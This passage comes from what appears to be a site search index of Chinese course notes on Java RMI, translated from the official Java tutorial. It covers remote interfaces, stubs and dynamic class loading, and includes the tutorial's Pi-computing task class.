\u7b26\u53f7\u7684\u503c\u8ba1\u7b97\u4e3a\u6307\u5b9a\u7684\u5c0f\u6570\u4f4d\u6570\u3002\u5bf9\u4e8e\u6b64\u793a\u4f8b\uff0c\u5b9e\u9645\u7b97\u6cd5\u5e76\u4e0d\u91cd\u8981\u3002\u91cd\u8981\u7684\u662f\u8be5\u7b97\u6cd5\u7684\u8ba1\u7b97\u91cf\u5f88\u5927\uff0c\u8fd9\u610f\u5473\u7740\u60a8\u5e0c\u671b\u5728\u529f\u80fd\u5f3a\u5927\u7684\u670d\u52a1\u5668\u4e0a\u6267\u884c\u8be5\u7b97\u6cd5\u3002 \u4ee5\u4e0b\u662f\u5b9e\u73b0 Task \u63a5\u53e3\u7684\u7c7b client.Pi \u7684\u6e90\u4ee3\u7801\uff1a package client; import compute.Task; import java.io.Serializable; import java.math.BigDecimal; public class Pi implements Task<BigDecimal>, Serializable { private static final long serialVersionUID = 227L; /** constants used in pi computation */ private static final BigDecimal FOUR = BigDecimal.valueOf(4); /** rounding mode to use during pi computation */ private static final int roundingMode = BigDecimal.ROUND_HALF_EVEN; /** digits of precision after the decimal point */ private final int digits; /** * Construct a task to calculate pi to the specified precision. */ public Pi(int digits) { this.digits = digits; } /** * Calculate pi. */ public BigDecimal execute() { return computePi(digits); } /** * Compute the value of pi to the specified number of digits after the decimal * point. The value is computed using Machin's formula: * * pi/4 = 4*arctan(1/5) - arctan(1/239) * * and a power series expansion of arctan(x) to sufficient precision. */ public static BigDecimal computePi(int digits) { int scale = digits + 5; BigDecimal arctan1_5 = arctan(5, scale); BigDecimal arctan1_239 = arctan(239, scale); BigDecimal pi = arctan1_5.multiply(FOUR).subtract(arctan1_239).multiply(FOUR); return pi.setScale(digits, BigDecimal.ROUND_HALF_UP); } /** * Compute the value, in radians, of the arctangent of the inverse of the * supplied integer to the specified number of digits after the decimal point. * The value is computed using the power series expansion for the arc tangent: * * arctan(x) = x - (x^3)/3 + (x^5)/5 - (x^7)/7 + (x^9)/9 ... */ public static BigDecimal arctan(int inverseX, int scale) { BigDecimal result, numer, term; BigDecimal invX = BigDecimal.valueOf(inverseX); BigDecimal invX2 = BigDecimal.valueOf(inverseX * inverseX); numer = BigDecimal.ONE.divide(invX, scale, roundingMode); result = numer; int i = 1; do { numer = numer.divide(invX2, scale, roundingMode); int denom = 2 * i + 1; term = numer.divide(BigDecimal.valueOf(denom), scale, roundingMode); if ((i % 2) != 0) { result = result.subtract(term); } else { result = result.add(term); } i++; } while (term.compareTo(BigDecimal.ZERO) != 0); return result; } } \u8bf7\u6ce8\u610f\uff0c\u6240\u6709\u53ef\u5e8f\u5217\u5316\u7c7b\uff08\u65e0\u8bba\u5b83\u4eec\u662f\u76f4\u63a5\u5b9e\u73b0\u8fd8\u662f\u95f4\u63a5\u5b9e\u73b0 Serializable \u63a5\u53e3\uff09\u90fd\u5fc5\u987b\u58f0\u660e\u4e00\u4e2a\u540d\u4e3a serialVersionUID \u7684\u79c1\u6709\u9759\u6001\u6700\u7ec8\u5b57\u6bb5\uff0c\u4ee5\u786e\u4fdd\u7248\u672c\u4e4b\u95f4\u7684\u5e8f\u5217\u5316\u517c\u5bb9\u6027\u3002\u5982\u679c\u6ca1\u6709\u53d1\u5e03\u8be5\u7c7b\u7684\u5148\u524d\u7248\u672c\uff0c\u5219\u8be5\u5b57\u6bb5\u7684\u503c\u53ef\u4ee5\u662f\u4efb\u4f55\u957f\u503c\uff0c\u7c7b\u4f3c\u4e8e Pi \u4f7f\u7528\u7684 227L \uff0c\u53ea\u8981\u8be5\u503c\u5728\u4ee5\u540e\u7684\u7248\u672c\u4e2d\u59cb\u7ec8\u4f7f\u7528\u5373\u53ef\u3002\u5982\u679c\u5df2\u53d1\u5e03\u8be5\u7c7b\u7684\u5148\u524d\u7248\u672c\u800c\u6ca1\u6709\u663e\u5f0f serialVersionUID \u58f0\u660e\uff0c\u4f46\u662f\u4e0e\u8be5\u7248\u672c\u7684\u5e8f\u5217\u5316\u517c\u5bb9\u6027\u5f88\u91cd\u8981\uff0c\u5219\u5fc5\u987b\u5c06\u5148\u524d\u7248\u672c\u7684\u9ed8\u8ba4\u9690\u5f0f\u8ba1\u7b97\u503c\u7528\u4f5c\u65b0\u7248\u672c\u7684\u663e\u5f0f\u58f0\u660e\u7684\u503c\u3002\u53ef\u4ee5\u9488\u5bf9\u5148\u524d\u7248\u672c\u8fd0\u884c serialver \u5de5\u5177\uff0c\u4ee5\u786e\u5b9a\u5176\u9ed8\u8ba4\u8ba1\u7b97\u503c\u3002 \u6b64\u793a\u4f8b\u6700\u6709\u8da3\u7684\u529f\u80fd\u662f\uff0c\u5728\u5c06 Pi \u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u7ed9 executeTask \u65b9\u6cd5\u4e4b\u524d\uff0c Compute \u5b9e\u73b0\u5bf9\u8c61\u6c38\u8fdc\u4e0d\u9700\u8981 Pi \u7c7b\u7684\u5b9a\u4e49\u3002\u6b64\u65f6\uff0c RMI \u5c06\u7528\u4e8e\u8be5\u7c7b\u7684\u4ee3\u7801\u52a0\u8f7d\u5230 Compute \u5bf9\u8c61\u7684 Java \u865a\u62df\u673a\u4e2d\uff0c\u8c03\u7528 execute \u65b9\u6cd5\uff0c\u7136\u540e\u6267\u884c\u4efb\u52a1\u7684\u4ee3\u7801\u3002\u7ed3\u679c\uff08\u5728 Pi \u4efb\u52a1\u7684\u60c5\u51b5\u4e0b\u662f BigDecimal \u5bf9\u8c61\uff09\u5c06\u8fd4\u56de\u7ed9\u8c03\u7528\u5ba2\u6237\u7aef\uff0c\u5728\u5ba2\u6237\u7aef\u7528\u4e8e\u6253\u5370\u8ba1\u7b97\u7ed3\u679c\u3002 \u63d0\u4f9b\u7684 Task \u5bf9\u8c61\u8ba1\u7b97 Pi \u503c\u7684\u4e8b\u5b9e\u4e0e ComputeEngine \u5bf9\u8c61\u65e0\u5173\u3002\u60a8\u8fd8\u53ef\u4ee5\u5b9e\u73b0\u4e00\u4e2a\u4efb\u52a1\uff0c\u4f8b\u5982\uff0c\u901a\u8fc7\u4f7f\u7528\u6982\u7387\u7b97\u6cd5\u6765\u751f\u6210\u968f\u673a\u8d28\u6570\u3002\u8be5\u4efb\u52a1\u4e5f\u9700\u8981\u5927\u91cf\u8ba1\u7b97\uff0c\u56e0\u6b64\u662f\u4f20\u9012\u7ed9 ComputeEngine \u7684\u5f88\u597d\u7684\u9009\u62e9\uff0c\u4f46\u662f\u5b83\u9700\u8981\u975e\u5e38\u4e0d\u540c\u7684\u4ee3\u7801\u3002\u5f53 Task \u5bf9\u8c61\u4f20\u9012\u5230 Compute \u5bf9\u8c61\u65f6\uff0c\u4e5f\u53ef\u4ee5\u4e0b\u8f7d\u6b64\u4ee3\u7801\u3002\u5c31\u50cf\u5728\u9700\u8981\u65f6\u5f15\u5165\u7528\u4e8e\u8ba1\u7b97 \\pi \u7b26\u53f7\u7684\u7b97\u6cd5\u7684\u65b9\u5f0f\u4e00\u6837\uff0c\u5c06\u5728\u9700\u8981\u65f6\u5f15\u5165\u751f\u6210\u968f\u673a\u7d20\u6570\u7684\u4ee3\u7801\u3002 Compute \u5bf9\u8c61\u4ec5\u77e5\u9053\u5b83\u63a5\u6536\u7684\u6bcf\u4e2a\u5bf9\u8c61\u90fd\u5b9e\u73b0\u4e86 execute \u65b9\u6cd5\u3002 Compute \u5bf9\u8c61\u4e0d\u77e5\u9053\uff0c\u4e5f\u4e0d\u9700\u8981\u77e5\u9053\u5b9e\u73b0\u7684\u4f5c\u7528\u3002 6. \u7f16\u8bd1\u5e76\u8fd0\u884c # \u8fd9\u4e00\u90e8\u5206\u6bcf\u4e2a\u7cfb\u7edf\u90fd\u4e0d\u592a\u4e00\u6837\uff0c\u63a8\u8350\u5927\u5bb6\u76f4\u63a5\u770b \u5b98\u65b9\u6587\u6863 \u3002 \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"9.Java\u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528(RMI)"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/9.Java%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%28RMI%29/#javarmi","text":"","title":"Java\u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528(RMI)"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/9.Java%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%28RMI%29/#_1","text":"Java\u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528(RMI) \u76ee\u5f55 1. \u80cc\u666f 2. RMI \u6982\u8ff0 3. \u4ec0\u4e48\u662f RMI \u5e94\u7528 3.1. \u5b9a\u4e49 3.2. \u52a8\u6001\u4ee3\u7801\u52a0\u8f7d\u7684\u4f18\u70b9 3.3. \u8fdc\u7a0b\u63a5\u53e3\u3001\u5bf9\u8c61\u548c\u65b9\u6cd5 3.4. \u4f7f\u7528RMI\u521b\u5efa\u5206\u5e03\u5f0f\u5e94\u7528\u7a0b\u5e8f 3.4.1. \u8bbe\u8ba1\u548c\u5b9e\u73b0\u5e94\u7528\u7a0b\u5e8f\u7ec4\u4ef6 3.4.2. \u7f16\u8bd1\u6e90\u6587\u4ef6 3.4.3. \u4f7f\u7c7b\u53ef\u4ee5\u901a\u8fc7\u7f51\u7edc\u8bbf\u95ee 3.4.4. \u542f\u52a8\u5e94\u7528\u7a0b\u5e8f 3.5. \u6784\u5efa\u4e00\u4e2a\u901a\u7528\u7684\u8ba1\u7b97\u5f15\u64ce 4. \u5982\u4f55\u5b9e\u73b0\u4e00\u4e2a RMI \u670d\u52a1\u5668 4.1. \u8bbe\u8ba1\u8fdc\u7a0b\u63a5\u53e3 4.2. \u5b9e\u73b0\u8fdc\u7a0b\u63a5\u53e3 4.2.1. \u58f0\u660e\u6b63\u5728\u5b9e\u73b0\u7684\u8fdc\u7a0b\u63a5\u53e3 4.2.2. \u5b9a\u4e49\u8fdc\u7a0b\u5bf9\u8c61\u7684\u6784\u9020\u65b9\u6cd5 4.2.3. \u63d0\u4f9b\u6bcf\u79cd\u8fdc\u7a0b\u65b9\u6cd5\u7684\u5b9e\u73b0 4.2.4. \u5728RMI\u4e2d\u4f20\u9012\u5bf9\u8c61 4.2.5. \u5b9e\u73b0\u670d\u52a1\u5668\u7aef\u7684main\u65b9\u6cd5 4.2.6. \u521b\u5efa\u548c\u5b89\u88c5\u5b89\u5168\u7ba1\u7406\u5668 4.2.7. \u4f7f\u8fdc\u7a0b\u5bf9\u8c61\u53ef\u4f9b\u5ba2\u6237\u7aef\u4f7f\u7528 5. \u5982\u4f55\u521b\u5efa\u4e00\u4e2a RMI \u5ba2\u6237\u7aef 6. \u7f16\u8bd1\u5e76\u8fd0\u884c","title":"\u76ee\u5f55"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/9.Java%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%28RMI%29/#1","text":"\u8fd9\u5b66\u671f\u4e0a\u4e86\u300a\u5206\u5e03\u5f0f\u7cfb\u7edf\u300b\u8bfe\u7a0b\uff0c\u5185\u5bb9\u4e3b\u8981\u662f\u57fa\u4e8eJava\u5b9e\u73b0\u5206\u5e03\u5f0f\u8ba1\u7b97\uff0c\u6240\u4ee5\u8001\u5e08\u524d\u51e0\u8282\u8bfe\u4e3b\u8981\u5728\u7ed9\u6211\u4eec\u8bb2\u7528Java\u505a\u5206\u5e03\u5f0f\u53ef\u80fd\u4f1a\u7528\u5230\u7684\u4e00\u4e9b\u6280\u672f\u3002\u4e3a\u4e86\u65b9\u4fbf\u5b66\u4e60\u548c\u8bb0\u5f55\uff0c\u6211\u5c06\u8001\u5e08\u8bb2\u7684\u5185\u5bb9\u7ed3\u5408\u4e66\u7c4d\u505a\u4e86\u4e00\u4e9b\u6574\u7406\uff0c\u8fd9\u4e00\u7bc7\u4e3b\u8981\u8ba8\u8bbaJava\u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528(RMI)\u3002 \u4e0b\u9762\u7684\u5185\u5bb9\u4e3b\u8981\u7ffb\u8bd1\u81ea Java\u5b98\u65b9\u6587\u6863 \u3002\u6211\u4f7f\u7528\u7684\u662f Google \u7ffb\u8bd1\uff0c\u7ffb\u5b8c\u4e86\u4ee5\u540e\u5982\u679c\u6709\u4e0d\u592a\u5bf9\u7684\u5730\u65b9\u5c31\u624b\u52a8\u8c03\u6574\u4e86\u4e00\u4e0b\uff0c\u96be\u514d\u6709\u4e00\u4e9b\u5730\u65b9\u7ffb\u8bd1\u5f97\u4e0d\u662f\u5f88\u6e05\u695a\uff0c\u6b22\u8fce\u6307\u51fa\uff0c\u6216\u76f4\u63a5\u67e5\u770b\u5b98\u65b9\u6587\u6863\u539f\u6587\u3002","title":"1. \u80cc\u666f"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/9.Java%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%28RMI%29/#2-rmi","text":"\u5b9a\u4e49 \uff1a Java\u8fdc\u7a0b\u65b9\u6cd5\u8c03\u7528(RMI) \u7cfb\u7edf\u5141\u8bb8\u5728\u4e00\u4e2aJava\u865a\u62df\u673a\u4e2d\u8fd0\u884c\u7684\u5bf9\u8c61\u8c03\u7528\u5728\u53e6\u4e00\u4e2a Java \u865a\u62df\u673a\u4e2d\u8fd0\u884c\u7684\u5bf9\u8c61\u7684\u65b9\u6cd5\u3002RMI\u63d0\u4f9b\u4e86\u7528 Java \u7f16\u7a0b\u8bed\u8a00\u7f16\u5199\u7684\u7a0b\u5e8f\u4e4b\u95f4\u7684\u8fdc\u7a0b\u901a\u4fe1\u3002 \u6ce8 \uff1a\u5982\u679c\u8981\u8fde\u63a5\u5230\u73b0\u6709\u7684 IDL \u7a0b\u5e8f\uff0c\u5e94\u8be5\u4f7f\u7528 Java IDL \u800c\u4e0d\u662fRMI\u3002 \u672c\u6587\u7b80\u8981\u6982\u8ff0\u4e86 RMI \u7cfb\u7edf\uff0c\u7136\u540e\u4ecb\u7ecd\u4e86\u4e00\u4e2a\u5b8c\u6574\u7684\u5ba2\u6237\u7aef/\u670d\u52a1\u5668\u793a\u4f8b\uff0c\u8be5\u793a\u4f8b\u4f7f\u7528 RMI \u7684\u72ec\u7279\u529f\u80fd\u5728\u8fd0\u884c\u65f6\u52a0\u8f7d\u548c\u6267\u884c\u7528\u6237\u5b9a\u4e49\u7684\u4efb\u52a1\u3002\u793a\u4f8b\u4e2d\u7684\u670d\u52a1\u5668\u5b9e\u73b0\u4e86\u4e00\u4e2a\u901a\u7528\u7684\u8ba1\u7b97\u5f15\u64ce\uff0c\u5ba2\u6237\u7aef\u4f7f\u7528\u8be5\u5f15\u64ce\u8ba1\u7b97 \\pi \u7b26\u53f7\u7684\u503c\u3002","title":"2. RMI \u6982\u8ff0"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/9.Java%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%28RMI%29/#3-rmi","text":"","title":"3. \u4ec0\u4e48\u662f RMI \u5e94\u7528"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/9.Java%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%28RMI%29/#31","text":"\u5b9a\u4e49 \uff1a RMI\u5e94\u7528\u7a0b\u5e8f \u901a\u5e38\u5305\u542b\u4e24\u4e2a\u72ec\u7acb\u7684\u7a0b\u5e8f\uff0c\u4e00\u4e2a\u670d\u52a1\u7aef\u548c\u4e00\u4e2a\u5ba2\u6237\u7aef\u3002 \u5178\u578b\u7684 \u670d\u52a1\u7aef\u7a0b\u5e8f \u4f1a\u521b\u5efa\u4e00\u4e9b\u8fdc\u7a0b\u5bf9\u8c61\uff0c\u4f7f\u8fd9\u4e9b\u5bf9\u8c61\u7684\u5f15\u7528\u53ef\u88ab\u8bbf\u95ee\uff0c\u5e76\u7b49\u5f85\u5ba2\u6237\u7aef\u8c03\u7528\u8fd9\u4e9b\u5bf9\u8c61\u4e0a\u7684\u65b9\u6cd5\u3002 \u5178\u578b\u7684 \u5ba2\u6237\u7aef\u7a0b\u5e8f \u4f1a\u83b7\u5f97\u5bf9\u670d\u52a1\u5668\u4e0a\u4e00\u4e2a\u6216\u591a\u4e2a\u8fdc\u7a0b\u5bf9\u8c61\u7684\u8fdc\u7a0b\u5f15\u7528\uff0c\u7136\u540e\u8c03\u7528\u8fd9\u4e9b\u5bf9\u8c61\u4e0a\u7684\u65b9\u6cd5\u3002RMI\u63d0\u4f9b\u4e86\u670d\u52a1\u5668\u548c\u5ba2\u6237\u673a\u4e4b\u95f4\u901a\u4fe1\u548c\u6765\u56de\u4f20\u9012\u4fe1\u606f\u7684\u673a\u5236\u3002\u8fd9\u6837\u7684\u5e94\u7528\u7a0b\u5e8f\u6709\u65f6\u88ab\u79f0\u4e3a\u5206\u5e03\u5f0f\u5bf9\u8c61\u5e94\u7528\u7a0b\u5e8f\u3002 \u5206\u5e03\u5f0f\u5bf9\u8c61\u5e94\u7528\u7a0b\u5e8f \u7684\u529f\u80fd: \u5b9a\u4f4d\u8fdc\u7a0b\u5bf9\u8c61 \u3002\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u4f7f\u7528\u5404\u79cd\u673a\u5236\u6765\u83b7\u53d6\u5bf9\u8fdc\u7a0b\u5bf9\u8c61\u7684\u5f15\u7528\u3002\u4f8b\u5982\uff0c\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u7528RMI\u7684\u7b80\u5355\u547d\u540d\u5de5\u5177\u2014\u2014RMI\u6ce8\u518c\u8868\u6765\u6ce8\u518c\u5b83\u7684\u8fdc\u7a0b\u5bf9\u8c61\u3002\u6216\u8005\uff0c\u5e94\u7528\u7a0b\u5e8f\u53ef\u4ee5\u4f5c\u4e3a\u5176\u4ed6\u8fdc\u7a0b\u8c03\u7528\u7684\u4e00\u90e8\u5206\u4f20\u9012\u548c\u8fd4\u56de\u8fdc\u7a0b\u5bf9\u8c61\u5f15\u7528\u3002 \u4e0e\u8fdc\u7a0b\u5bf9\u8c61\u901a\u4fe1 \u3002\u8fdc\u7a0b\u5bf9\u8c61\u4e4b\u95f4\u901a\u4fe1\u7684\u7ec6\u8282\u7531RMI\u5904\u7406\u3002\u5bf9\u4e8e\u7a0b\u5e8f\u5458\u6765\u8bf4\uff0c\u8fdc\u7a0b\u901a\u4fe1\u7c7b\u4f3c\u4e8e\u666e\u901a\u7684Java\u65b9\u6cd5\u8c03\u7528\u3002 \u52a0\u8f7d\u4f20\u9012\u7684\u5bf9\u8c61\u7684\u7c7b\u5b9a\u4e49 \u3002\u56e0\u4e3aRMI\u5141\u8bb8\u5bf9\u8c61\u6765\u56de\u4f20\u9012\uff0c\u6240\u4ee5\u5b83\u63d0\u4f9b\u4e86\u52a0\u8f7d\u5bf9\u8c61\u7684\u7c7b\u5b9a\u4e49\u4ee5\u53ca\u4f20\u8f93\u5bf9\u8c61\u6570\u636e\u7684\u673a\u5236\u3002 \u4e0b\u9762\u7684\u63d2\u56fe\u63cf\u8ff0\u4e86\u4e00\u4e2a RMI\u5206\u5e03\u5f0f\u5e94\u7528\u7a0b\u5e8f \uff0c\u5b83\u4f7f\u7528 RMI\u6ce8\u518c\u8868 \u6765\u83b7\u53d6\u5bf9\u8fdc\u7a0b\u5bf9\u8c61\u7684\u5f15\u7528\u3002 \u670d\u52a1\u5668\u8c03\u7528\u6ce8\u518c\u8868\u5c06\u540d\u79f0\u4e0e\u8fdc\u7a0b\u5bf9\u8c61\u5173\u8054\uff08\u6216\u7ed1\u5b9a\uff09\u3002 \u5ba2\u6237\u7aef\u901a\u8fc7\u670d\u52a1\u5668\u6ce8\u518c\u8868\u4e2d\u7684\u540d\u79f0\u67e5\u627e\u8fdc\u7a0b\u5bf9\u8c61\uff0c\u7136\u540e\u5728\u5176\u4e0a\u8c03\u7528\u4e00\u4e2a\u65b9\u6cd5\u3002 \u56fe\u4e2d\u8fd8\u663e\u793a\u4e86 RMI \u7cfb\u7edf\u4f7f\u7528\u4e00\u4e2a\u73b0\u6709\u7684 web \u670d\u52a1\u5668\u6765\u52a0\u8f7d\u7c7b\u5b9a\u4e49\uff0c\u4ece\u670d\u52a1\u5668\u5230\u5ba2\u6237\u7aef\uff0c\u4ece\u5ba2\u6237\u7aef\u5230\u670d\u52a1\u5668\uff0c\u5728\u9700\u8981\u7684\u65f6\u5019\u52a0\u8f7d\u5bf9\u8c61\u3002 \\text{Figure 1. RMI\u5e94\u7528\u7a0b\u5e8f}","title":"3.1. \u5b9a\u4e49"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/9.Java%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%28RMI%29/#32","text":"RMI \u7684\u6838\u5fc3\u548c\u72ec\u7279\u7684\u7279\u6027\u4e4b\u4e00\u662f\uff0c\u5982\u679c\u5bf9\u8c61\u7684\u7c7b\u6ca1\u6709\u5728\u63a5\u6536\u65b9\u7684 Java \u865a\u62df\u673a\u4e2d\u5b9a\u4e49\uff0c\u5b83\u5c31\u80fd\u591f\u4e0b\u8f7d\u5bf9\u8c61\u7684\u7c7b\u7684\u5b9a\u4e49\u3002\u5bf9\u8c61\u7684\u6240\u6709\u7c7b\u578b\u548c\u884c\u4e3a\uff08\u4ee5\u524d\u53ea\u80fd\u5728\u5355\u4e2a Java \u865a\u62df\u673a\u4e2d\u4f7f\u7528\uff09\u90fd\u53ef\u4ee5\u4f20\u8f93\u5230\u53e6\u4e00\u4e2a\uff08\u53ef\u80fd\u662f\u8fdc\u7a0b\u7684\uff09 Java \u865a\u62df\u673a\u3002RMI\u901a\u8fc7\u5bf9\u8c61\u7684\u5b9e\u9645\u7c7b\u4f20\u9012\u5bf9\u8c61\uff0c\u56e0\u6b64\u5f53\u5bf9\u8c61\u88ab\u53d1\u9001\u5230\u53e6\u4e00\u4e2a Java \u865a\u62df\u673a\u65f6\uff0c\u5bf9\u8c61\u7684\u884c\u4e3a\u4e0d\u4f1a\u6539\u53d8\u3002\u8be5\u529f\u80fd\u5141\u8bb8\u5c06\u65b0\u7684\u7c7b\u578b\u548c\u884c\u4e3a\u5f15\u5165\u8fdc\u7a0b Java \u865a\u62df\u673a\uff0c\u4ece\u800c\u52a8\u6001\u6269\u5c55\u5e94\u7528\u7a0b\u5e8f\u7684\u884c\u4e3a\u3002\u672c\u6587\u4e2d\u7684\u8ba1\u7b97\u5f15\u64ce\u793a\u4f8b\u4f7f\u7528\u6b64\u529f\u80fd\u4e3a\u5206\u5e03\u5f0f\u7a0b\u5e8f\u5f15\u5165\u65b0\u7684\u884c\u4e3a\u3002","title":"3.2. \u52a8\u6001\u4ee3\u7801\u52a0\u8f7d\u7684\u4f18\u70b9"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/9.Java%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%28RMI%29/#33","text":"\u4e0e\u4efb\u4f55\u5176\u4ed6 Java \u5e94\u7528\u7a0b\u5e8f\u4e00\u6837\uff0c\u4f7f\u7528 Java RMI \u6784\u5efa\u7684\u5206\u5e03\u5f0f\u5e94\u7528\u7a0b\u5e8f\u7531\u63a5\u53e3\u548c\u7c7b\u7ec4\u6210\u3002\u63a5\u53e3\u58f0\u660e\u65b9\u6cd5\u3002\u8fd9\u4e9b\u7c7b\u5b9e\u73b0\u63a5\u53e3\u4e2d\u58f0\u660e\u7684\u65b9\u6cd5\uff0c\u53ef\u80fd\u8fd8\u58f0\u660e\u5176\u4ed6\u65b9\u6cd5\u3002\u5728\u5206\u5e03\u5f0f\u5e94\u7528\u7a0b\u5e8f\u4e2d\uff0c\u4e00\u4e9b\u5b9e\u73b0\u53ef\u80fd\u9a7b\u7559\u5728\u4e00\u4e9b Java \u865a\u62df\u673a\u4e2d\uff0c\u800c\u4e0d\u662f\u5176\u4ed6\u865a\u62df\u673a\u3002\u5177\u6709\u53ef\u4ee5\u8de8 Java \u865a\u62df\u673a\u8c03\u7528\u7684\u65b9\u6cd5\u7684\u5bf9\u8c61\u79f0\u4e3a\u8fdc\u7a0b\u5bf9\u8c61\u3002 \u5bf9\u8c61\u901a\u8fc7\u5b9e\u73b0\u8fdc\u7a0b\u63a5\u53e3\u800c\u6210\u4e3a\u8fdc\u7a0b\u5bf9\u8c61\uff0c\u8fdc\u7a0b\u63a5\u53e3\u5177\u6709\u4ee5\u4e0b\u7279\u5f81: \u8fdc\u7a0b\u63a5\u53e3\u6269\u5c55\u4e86 java.rmi.Remote \u63a5\u53e3\u3002 \u63a5\u53e3\u7684\u6bcf\u4e2a\u65b9\u6cd5\u5728\u5b83\u7684 throws \u5b50\u53e5\u4e2d\u90fd\u58f0\u660e\u4e86 java.rmi.RemoteException \uff0c\u4ee5\u53ca\u4efb\u4f55\u7279\u5b9a\u4e8e\u5e94\u7528\u7a0b\u5e8f\u7684\u5f02\u5e38\u3002 \u5f53\u5bf9\u8c61\u4ece\u4e00\u4e2a Java \u865a\u62df\u673a\u4f20\u9012\u5230\u53e6\u4e00\u4e2a Java \u865a\u62df\u673a\u65f6\uff0c RMI \u5c06\u8fdc\u7a0b\u5bf9\u8c61\u4e0e\u975e\u8fdc\u7a0b\u5bf9\u8c61\u533a\u522b\u5bf9\u5f85\u3002 RMI \u4e0d\u662f\u5728\u63a5\u6536\u65b9\u7684 Java \u865a\u62df\u673a\u4e2d\u590d\u5236\u5b9e\u73b0\u5bf9\u8c61\uff0c\u800c\u662f\u4e3a\u8fdc\u7a0b\u5bf9\u8c61\u4f20\u9012 \u8fdc\u7a0b\u5b58\u6839\uff08Stub\uff09 \u3002\u5b58\u6839\u5145\u5f53\u8fdc\u7a0b\u5bf9\u8c61\u7684\u672c\u5730\u4ee3\u8868\u6216\u4ee3\u7406\uff0c\u5bf9\u4e8e\u5ba2\u6237\u7aef\u6765\u8bf4\uff0c\u5b83\u57fa\u672c\u4e0a\u662f\u8fdc\u7a0b\u5f15\u7528\u3002\u5ba2\u6237\u7aef\u8c03\u7528\u672c\u5730\u5b58\u6839\u4e0a\u7684\u65b9\u6cd5\uff0c\u8be5\u65b9\u6cd5\u8d1f\u8d23\u5bf9\u8fdc\u7a0b\u5bf9\u8c61\u6267\u884c\u65b9\u6cd5\u8c03\u7528\u3002 \u8fdc\u7a0b\u5bf9\u8c61\u7684 \u5b58\u6839 \uff08Stub\uff09\u5b9e\u73b0\u8fdc\u7a0b\u5bf9\u8c61\u5b9e\u73b0\u7684\u540c\u4e00\u7ec4\u8fdc\u7a0b\u63a5\u53e3\u3002\u6b64\u5c5e\u6027\u5141\u8bb8\u5c06\u5b58\u6839\u8f6c\u6362\u4e3a\u8fdc\u7a0b\u5bf9\u8c61\u5b9e\u73b0\u7684\u4efb\u4f55\u63a5\u53e3\u3002\u4f46\u662f\uff0c\u53ea\u6709\u5728\u8fdc\u7a0b\u63a5\u53e3\u4e2d\u5b9a\u4e49\u7684\u90a3\u4e9b\u65b9\u6cd5\u53ef\u4ee5\u4ece\u63a5\u6536\u7684Java\u865a\u62df\u673a\u4e2d\u8c03\u7528\u3002 \u56fe2-3 \u80fd\u591f\u66f4\u52a0\u6e05\u6670\u5730\u63cf\u8ff0RMI\u7684\u4ea4\u4e92\u8fc7\u7a0b\u3002 \\text{Figure 2. RMI\u7684\u4ea4\u4e92\u56fe} \\text{Figure 3. \u5b58\u6839\u548c\u9aa8\u5e72\u7f51\u7684\u5177\u4f53\u901a\u4fe1\u8fc7\u7a0b}","title":"3.3. \u8fdc\u7a0b\u63a5\u53e3\u3001\u5bf9\u8c61\u548c\u65b9\u6cd5"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/Java%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/9.Java%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%28RMI%29/#34-rmi","text":"\u4f7f\u7528RMI\u6765\u5f00\u53d1\u4e00\u4e2a\u5206\u5e03\u5f0f\u5e94\u7528\u7a0b\u5e8f\u5305\u62ec\u4ee5\u4e0b\u4e00\u822c\u6b65\u9aa4: \u8bbe\u8ba1\u548c\u5b9e\u73b0\u5206\u5e03\u5f0f\u5e94\u7528\u7a0b\u5e8f\u7684\u7ec4\u4ef6 